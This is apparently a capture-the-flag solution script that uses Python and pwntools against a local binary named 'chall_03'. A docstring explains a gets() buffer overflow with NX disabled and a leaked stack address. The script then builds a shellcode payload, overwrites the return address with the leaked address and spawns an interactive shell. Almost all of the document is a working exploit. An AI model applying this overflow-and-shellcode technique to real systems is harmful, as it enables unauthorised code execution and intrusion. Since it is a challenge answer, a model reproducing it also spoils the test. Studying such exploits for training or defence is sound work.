'''
Flaws: NX disabled
Security: PIE enabled

Output "I'll make it" displays address of RSP. Example:
rsp = 0x7ffd2e6ca8a0
rbp = 0x7ffd2e6ca910
where 0x7ffd2e6ca910 - 0x7ffd2e6ca8a0 = 0x70
Meaning that the vulnerable function has a buffer of 0x70

The printf statement leaks the address of local_78 (on the stack with RWX enabled). 
gets() can be used to received our shellcode and then overwrite the return address 
with the address of our shellcode.

70h = 112 decimal
112 + 8 (return addess) = 120
in 64 bits is 8 bytes

We have to create a pad such that we override the return address.
'''

from pwn import *

p = process("./chall_03")
l1 = b"something dumb"
p.sendline(l1)

print(p.recvuntil(b"0x"))
leak = p.recvuntil(b"\n")
#print("--->" + str(leak))
leak = int(leak, 16)
print("---> " + hex(leak))

# Set arch64 to get 64 compatible shellcodels

context.arch = "amd64"
payload = asm(shellcraft.sh())
print("---> A * (120 - " + str(len(payload)) + ")")
print("---> payload  : " + str(payload))
length = len(payload)
print("---> b'A'*("+str(120-length)+"))  : " + str(b"A"*(120 - length)))
print("---> p64(leak): " + str(p64(leak)))
payload += b"A"*(120 - length) + p64(leak)

print("---> " + str(payload))
p.sendline(payload)
p.interactive()
